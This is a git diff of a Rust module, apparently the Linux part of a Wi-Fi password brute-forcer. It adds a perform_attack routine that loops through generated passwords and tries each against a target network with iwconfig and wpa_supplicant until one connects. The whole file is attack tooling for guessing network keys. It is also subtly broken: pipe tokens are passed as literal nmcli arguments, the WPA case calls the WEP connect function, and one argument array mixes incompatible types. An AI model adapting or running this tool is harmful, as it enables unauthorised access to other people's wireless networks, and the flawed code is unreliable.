@@ -1,5 +1,7 @@
+use wifi::WifiBruteforcer;
 use network::{Network, NetworkType, NetworkTypeParseError};
 use std::io;
+use std::io::{Error, ErrorKind};
 use std::process::{Command, Output};
 
 pub struct Linux {
@@ -10,21 +12,34 @@ pub struct Linux {
 impl Linux {
   pub fn new(name: String) -> Result<Self, io::Error> {
     // detect the network type here (and call: check_if_web_or_wpa here)
-
-    Ok(Linux {
-      name,
-      network_type: NetworkType::WEP,
-    })
+    match Linux::check_if_web_or_wpa(name.clone()) {
+      Ok(t) => match t {
+        NetworkType::WEP => Ok(Linux {
+          name: name.clone(),
+          network_type: NetworkType::WEP,
+        }),
+        _ => Ok(Linux {
+          name: name.clone(),
+          network_type: NetworkType::WPA,
+        }),
+      },
+      Err(_) => Err(Error::new(ErrorKind::Other, "Failed to parse")), // use the NetworkTypeParseError::IoError here
+    }
   }
 
-  pub fn check_if_web_or_wpa(&self) -> Result<NetworkType, NetworkTypeParseError> {
-    let command = format!(
-      "nmcli con list id \"{}\" | awk '/key-mgmt/ {{ print $2 }}' ",
-      self.name
-    );
-
-    Command::new("sh")
-      .args(&["/C", &command[..]])
+  fn check_if_web_or_wpa(name: String) -> Result<NetworkType, NetworkTypeParseError> {
+    Command::new("nmcli")
+      .args(&[
+        "con",
+        "list",
+        "id",
+        "\"",
+        &name,
+        "\"",
+        "|",
+        "awk",
+        "'/key-mgmt/ {{ print $2 }}'",
+      ])
       .output()
       .map_err(|err| NetworkTypeParseError::IoError(err))
       .and_then(|output| {
@@ -37,40 +52,60 @@ impl Linux {
       })
   }
 
-  pub fn connect_to_wep_network(&self) -> Result<Output, io::Error> {
-    let command = format!(
-      "iwconfig wlan0 essid {} key s:wehhnhkjjb2jh3jh2h4",
-      self.name
-    ); // using some dummy password here
-
-    Command::new("sh").args(&[&command[..]]).output()
+  pub fn connect_to_wep_network(&self, password: &str) -> Result<Output, io::Error> {
+    Command::new("iwconfig")
+      .args(&["wlan0", "essid", &self.name, "key", password])
+      .output()
   }
 
-  pub fn connect_to_wpa_network(&self) -> Result<Output, io::Error> {
-    let command = format!(
-      "wpa_passphrase {} wehhnhkjjb2jh3jh2h4 > wpa.conf", // dynamically generate differennt version of file (if running sync)
-      self.name
-    ); // using some dummy password here
+  pub fn connect_to_wpa_network(&self, password: &str) -> Result<Output, io::Error> {
+    // Dynamically generate differennt version of file (if running sync)
+    Command::new("wpa_passphrase")
+      .args(&[
+        self.name,
+        password.to_string(),
+        "wpa.conf".to_string(),
+      ])
+      .output()?;
 
-    Command::new("sh").args(&[&command[..]]).output()
+    Ok(
+      Command::new("wpa_supplicant")
+        .args(&["-Dwext", "-i", "wlan0", "-c/root/wpa.conf"])
+        .output()?,
+    )
   }
 }
 
 impl Network for Linux {
-  fn connect(&self) -> bool {
+  fn connect(&self, password: &str) -> bool {
     match self.network_type {
       NetworkType::WEP => self
-        .connect_to_wep_network()
+        .connect_to_wep_network(password)
         .map_err(|_err| false)
         .unwrap()
         .status
         .success(),
       _ => self
-        .connect_to_wep_network()
+        .connect_to_wep_network(password)
         .map_err(|_err| false)
         .unwrap()
         .status
         .success(),
     }
+  }
+
+  fn perform_attack(&self, bruteforcer: &mut WifiBruteforcer) -> Result<Option<String>, io::Error> {
+    // Generate password combination
+    let trial_passwords = bruteforcer.generate_all_possible_password();
+
+    // This needs GREAT improvement:
+    // Better approach: ?
+    for password in trial_passwords.iter() {
+      if self.connect(password) {
+        return Ok(Some(password.to_string()));
+      }
+    }
+
+    Ok(None)
   }
 }
